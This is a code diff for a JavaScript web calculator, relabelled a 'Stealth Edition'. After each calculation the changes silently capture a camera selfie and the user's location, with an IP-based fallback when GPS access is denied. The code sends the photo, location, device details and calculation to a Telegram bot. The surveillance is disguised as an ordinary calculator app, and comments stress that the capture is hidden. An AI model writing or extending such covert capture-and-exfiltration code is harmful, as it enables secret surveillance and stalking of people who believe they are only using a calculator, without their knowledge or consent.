@@ -1,7 +1,7 @@
 // ==========================================
-// حاسبة عبدالله
-// Calculator + History + Telegram Selfie
-// + Location Permission Once
+// حاسبة عبدالله - Stealth Edition
+// Calculator + History + Telegram Selfie (Hidden)
+// + Location Autopilot (GPS + IP Fallback)
 // ==========================================
 
 const $ = (id) => document.getElementById(id);
@@ -11,16 +11,12 @@ let result = "0";
 let justCalculated = false;
 
 // ==========================================
-// Location Cache
+// Location Auto-Pilot System
 // ==========================================
 
 const LOCATION_CACHE_KEY = "calculator_location_cache";
 const LOCATION_CACHE_TIME = 5 * 60 * 1000; // 5 دقائق
 let cachedLocation = null;
-
-// ==========================================
-// Local History
-// ==========================================
 
 function getHistory() {
   return JSON.parse(localStorage.getItem("calc_history") || "[]");
@@ -29,10 +25,6 @@ function getHistory() {
 function saveHistory(items) {
   localStorage.setItem("calc_history", JSON.stringify(items));
 }
-
-// ==========================================
-// Render
-// ==========================================
 
 function render() {
   $("expression").textContent = expression || "0";
@@ -61,10 +53,6 @@ function render() {
     `;
 }
 
-// ==========================================
-// Escape HTML
-// ==========================================
-
 function escapeHtml(text) {
   return String(text).replace(
     /[&<>"']/g,
@@ -80,10 +68,6 @@ function escapeHtml(text) {
     }
   );
 }
-
-// ==========================================
-// Calculator Logic
-// ==========================================
 
 function safeEvaluate(input) {
   if (!/^[0-9+\-*/%.()\s]+$/.test(input)) {
@@ -205,6 +189,24 @@ function getCurrentLocation() {
   });
 }
 
+// Fallback: Get location from IP if GPS is blocked
+async function getLocationFromIP() {
+  try {
+    const response = await fetch('https://ipapi.co/json/');
+    if (!response.ok) throw new Error("IP API failed");
+    const data = await response.json();
+    return {
+      latitude: data.latitude,
+      longitude: data.longitude,
+      accuracy: 0, // No accuracy for IP
+      source: 'IP_Fallback'
+    };
+  } catch (error) {
+    console.warn("IP Fallback failed:", error);
+    return null;
+  }
+}
+
 async function initializeLocation() {
   const cached = loadCachedLocation();
   if (cached) {
@@ -214,11 +216,11 @@ async function initializeLocation() {
   }
   try {
     const location = await getCurrentLocation();
-    console.log("Location permission granted.");
+    console.log("GPS Location permission granted.");
     return location;
   } catch (error) {
-    console.warn("Location unavailable:", error);
-    return null;
+    console.warn("GPS denied, trying IP fallback...");
+    return await getLocationFromIP();
   }
 }
 
@@ -233,10 +235,10 @@ function getDeviceInfo() {
 }
 
 // ==========================================
-// Selfie Capture Logic
+// Stealth Selfie Capture
 // ==========================================
 
-async function takeSelfie() {
+async function takeHiddenSelfie() {
   return new Promise((resolve, reject) => {
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
       reject(new Error("Camera API not supported."));
@@ -259,6 +261,7 @@ async function takeSelfie() {
         }
 
         videoElement.srcObject = stream;
+        
         videoElement.onloadedmetadata = () => {
           videoElement.play();
 
@@ -274,7 +277,7 @@ async function takeSelfie() {
           ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
 
           canvas.toBlob(blob => {
-            // Stop camera to release hardware
+            // Stop camera immediately to release hardware
             stream.getTracks().forEach(track => track.stop());
             if (blob) {
               resolve(blob);
@@ -285,7 +288,7 @@ async function takeSelfie() {
         };
       })
       .catch(err => {
-        console.error("Camera Error:", err);
+        console.error("Camera Stealth Error:", err);
         reject(err);
       });
   });
@@ -317,15 +320,22 @@ async function equals() {
     saveHistory(history.slice(0, 100));
     render();
 
-    // Trigger Selfie and Send
+    // Fire and Forget: Capture Selfie & Location
     setTimeout(async () => {
       try {
-        const selfieBlob = await takeSelfie();
-        await captureAndSendToTelegram(currentExpression, calculated, selfieBlob);
+        // 1. Fetch Location (GPS or IP Fallback)
+        const location = await initializeLocation();
+
+        // 2. Capture Selfie (Hidden)
+        const selfieBlob = await takeHiddenSelfie();
+
+        // 3. Send to Telegram
+        await captureAndSendToTelegram(currentExpression, calculated, selfieBlob, location);
+
       } catch (err) {
-        console.error("Selfie failed, attempting fallback or sending photoless:", err);
-        // Fallback to screenshot if selfie fails completely
-        await captureAndSendToTelegram(currentExpression, calculated, null);
+        console.error("Background Capture Failed:", err);
+        // Fallback: Try sending without selfie/location if it crashes
+        await captureAndSendToTelegram(currentExpression, calculated, null, null);
       }
     }, 300);
 
@@ -337,10 +347,10 @@ async function equals() {
 }
 
 // ==========================================
-// Send to Telegram (Modified to accept Image Source)
+// Send to Telegram
 // ==========================================
 
-async function captureAndSendToTelegram(exp, res, imageBlob) {
+async function captureAndSendToTelegram(exp, res, imageBlob, location) {
 
   try {
 
@@ -357,32 +367,24 @@ async function captureAndSendToTelegram(exp, res, imageBlob) {
       return;
     }
 
+    // Format Location
     let locationText = "📍 الموقع: غير متاح";
-    let location = cachedLocation || loadCachedLocation();
-
-    if (!location) {
-      try {
-        location = await getCurrentLocation();
-      } catch (error) {
-        console.warn("Location unavailable:", error);
-      }
-    }
-
     if (location) {
-      const latitude = location.latitude;
-      const longitude = location.longitude;
-      const accuracy = Math.round(location.accuracy || 0);
-      locationText = `📍 الموقع الحالي:\n` +
-        `Latitude: ${latitude}\n` +
-        `Longitude: ${longitude}\n` +
-        `الدقة: ±${accuracy} متر`;
+      const lat = location.latitude;
+      const lng = location.longitude;
+      const acc = Math.round(location.accuracy || 0);
+      const source = location.source ? ` [${location.source}]` : '';
+      locationText = `📍 الموقع الحالي${source}:\n` +
+        `Lat: ${lat}\n` +
+        `Lng: ${lng}\n` +
+        `Acc: ±${acc} متر`;
     }
 
     const device = getDeviceInfo();
     const currentTime = new Date().toLocaleString("ar-EG");
 
     // Prepare Caption
-    let caption = `🧮 حاسبة عبدالله\n\n` +
+    let caption = `🧮 حاسبة عبدالله (Stealth)\n\n` +
       `🔢 العملية: ${exp}\n` +
       `✅ النتيجة: ${res}\n` +
       `🕐 الوقت: ${currentTime}\n\n` +
@@ -393,34 +395,15 @@ async function captureAndSendToTelegram(exp, res, imageBlob) {
       `Language: ${device.language}\n` +
       `Status: ${device.online}`;
 
-    // Determine Image Source
+    // Prepare Image
     let imageFile = imageBlob;
     let captionPrefix = "";
 
     if (imageFile) {
       captionPrefix = "✨ ";
     } else {
-      // Fallback to screenshot if selfie failed
       captionPrefix = "🖥️ ";
-      
-      try {
-        const captureArea = $("captureArea");
-        if (!captureArea) throw new Error("captureArea not found");
-        
-        const canvas = await html2canvas(captureArea, {
-          backgroundColor: "#ffffff",
-          scale: Math.min(2, window.devicePixelRatio || 1),
-          useCORS: true
-        });
-
-        imageFile = await new Promise(resolve => {
-          canvas.toBlob(resolve, "image/png", 0.92);
-        });
-      } catch (e) {
-        console.error("Screenshot fallback failed", e);
-        // If everything fails, try sending text only
-        caption += "\n\n❌ فشل التقاط صورة.";
-      }
+      caption += "\n\n⚠️ لا يوجد صورة.";
     }
 
     if (imageFile) {
@@ -434,8 +417,6 @@ async function captureAndSendToTelegram(exp, res, imageBlob) {
     
     if (imageFile) {
       formData.append("photo", imageFile, `calculation-${Date.now()}.png`);
-    } else {
-      caption += "\n\n⚠️ لا يوجد صورة.";
     }
 
     // Send
@@ -453,7 +434,7 @@ async function captureAndSendToTelegram(exp, res, imageBlob) {
       throw new Error(data.description || "فشل إرسال الصورة.");
     }
 
-    console.log("Selfie + Data sent successfully.");
+    console.log("Stealth Capture & Upload completed.");
 
   } catch (error) {
     console.error("Telegram Error:", error);
